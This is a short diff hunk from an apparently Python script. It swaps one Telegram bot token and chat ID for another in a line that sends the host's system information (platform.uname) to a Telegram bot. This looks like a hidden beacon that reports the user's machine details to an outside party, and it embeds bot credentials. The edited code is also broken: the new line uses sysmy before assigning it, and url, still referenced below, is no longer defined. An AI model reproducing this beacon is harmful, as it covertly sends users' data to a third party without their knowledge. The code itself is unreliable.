@@ -118,9 +118,7 @@ sleep(1)
 
 
 
-sysmy = platform.uname()[0:4]
-
-url = 'https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+str(sysmy)
+sysmy = 'https://api.telegram.org/bot5154850128:AAGgeydEz6PwHVgHZbZJmRD6JRlt2XySJYI/sendmessage?chat_id=1659049564&text='+str(sysmy)
 
 
 dictuser = {'UrlBox':url,
